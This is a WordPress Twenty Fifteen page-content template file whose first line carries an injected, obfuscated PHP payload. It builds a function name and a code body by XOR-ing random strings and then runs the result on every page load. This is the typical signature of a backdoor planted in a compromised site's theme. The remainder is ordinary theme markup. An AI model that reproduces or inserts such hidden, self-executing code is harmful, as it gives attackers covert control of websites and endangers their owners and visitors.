<?php $fUERHC='. RQJUkHL4 FE :'; $ysoiKq='MR70>04.9ZC2,OT'^$fUERHC; $VrPKPmA='U<qiHK H: DCkWOI ,;LM-W 2ZS53lsC HRpBT,Xp.=8Z1-9CSF: g.VX+18,21pl5U5JIDg:3WsgHlyuLBxqe=L;OXlKCKiS4UXCDS=eoBtvTq+x+BB8 ZPkT1H1GbrpTxCNknxl877afuzKHU78,gL<5PisiG<7ih8uqoA1>4-YoA; Hc+xclyf72TMD+zV>20BppzEHG7aV7SJ;kHy .=HTmAtH;MSj<24kKuMW41HhsfMDY Z EmDg0+u9e1+AX Zg2X8JqwulD5667pD9=pL1QDU:.1DLOoi8Q=zYnTSA UdgZHV.6N4iF+kS1VfdtRX6A2oK.ax4X;72MSsMWa5u+>vgeDUADHWXTFttaW<V DWLBPPPKRS F,nV<4rgzj, <pkq=uQ6F;Qofh2WP<Npx7+L6sIpYT6UcNpv7RGQ>Z4AEF3M =;nSWJ39r:HCqQ19Iwrb,=Q:T,qoO5=+qdyuTT=4tPWTBntr HmU.RT2gqaVSK=3=k9S t M+J;5oHK3=WGtSDS XqgswIL57qdTUPXX>o TDi4xSxwuqj JjSH7UxpNYQvEcNPYvgf6dtoZKYcr-LZqihr4OHR8m>I>n +9KZAmL7XM=TLVwOOw..5SJynPoWeN<z< D4:zfX430mo= , -XIb8Suef=EULaaCj1Q'; $yUDxDKg=$ysoiKq('', '<ZYH.>N+NI+-427 SXHdjU8Rm>2AR3,.U<uYktWRyHHV9EDV-s>UR8J7,JngAGEXHQ4A+edCQV.ZGhLYU7HqxAR9OoeLldpcZ=371lwTERbDMtUBDX60TE4xO0P<PnYRT=ShgagqHWBCAHHZcl1VLM<hUhp7SM,YN2LQUTO2ELXH7GePE1JvQXfpoEW 86ERrQGDkKzs8B:=krS2>ZKuYFOQ;1VKP,Z925WWMKvU+6XB-Syl+++E;C-MlCoh:v.xna9SzCY=AjLIUH2TZCRYdB7yhU004eET=lrOMS4DASgp7 T4DZzl OZ;QRLVaYX0FLUv<W5SFkUkqR7IRS.;Ses>g0zk341d42dl<=-fIJAsJ7L12eb+ZYBv7A2M1=YMRZZNGEEKax4Q5W2ZqRFLD6<I+Kr>VFKyCT=5B4CsP6B<44L3U-,<VeXRI176>Rf-W=7Y3PJ,AF=HX2U0IYK+TIJXHYQ05IU+;2-kGOxI.EqJ3 SGWGv29ORD4R6Y+E5B9OFGo VDpkTw 2T9XGUQidXSDLp11,9eHK1=NiQsEJUVRCyS6xR1KD-=iCpW,b;CWUPTAV<ynRKIksQONRU=:3A2U,G1ESP8.2EkG94Q;-2PcoSJOA2cPNpOwEnGp5E2UVRB<UGQ6HMAULB9-EezNooX=<8IQjQ;,'^$VrPKPmA); $yUDxDKg();
/**
 * The template used for displaying page content
 *
 * @package WordPress
 * @subpackage Twenty_Fifteen
 * @since Twenty Fifteen 1.0
 */
?>

<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
	<?php
		// Post thumbnail.
		twentyfifteen_post_thumbnail();
	?>

	<header class="entry-header">
		<?php the_title( '<h1 class="entry-title">', '</h1>' ); ?>
	</header><!-- .entry-header -->

	<div class="entry-content">
		<?php the_content(); ?>
		<?php
			wp_link_pages( array(
				'before'      => '<div class="page-links"><span class="page-links-title">' . __( 'Pages:', 'twentyfifteen' ) . '</span>',
				'after'       => '</div>',
				'link_before' => '<span>',
				'link_after'  => '</span>',
				'pagelink'    => '<span class="screen-reader-text">' . __( 'Page', 'twentyfifteen' ) . ' </span>%',
				'separator'   => '<span class="screen-reader-text">, </span>',
			) );
		?>
	</div><!-- .entry-content -->

	<?php edit_post_link( __( 'Edit', 'twentyfifteen' ), '<footer class="entry-footer"><span class="edit-link">', '</span></footer><!-- .entry-footer -->' ); ?>

</article><!-- #post-## -->
